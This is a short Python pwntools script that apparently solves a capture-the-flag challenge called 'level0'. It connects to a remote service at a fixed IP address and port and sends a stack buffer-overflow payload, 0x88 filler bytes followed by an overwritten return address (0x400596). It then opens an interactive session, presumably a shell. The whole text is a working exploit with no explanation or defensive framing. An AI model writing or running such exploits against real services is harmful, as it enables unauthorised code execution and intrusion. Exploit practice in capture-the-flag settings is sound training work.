from pwn import *
p=process("./level0")
p=remote("111.198.29.45","34694")
p.recv()
payload='a'*0x88+p64(0x400596)
p.sendline(payload)
p.interactive()
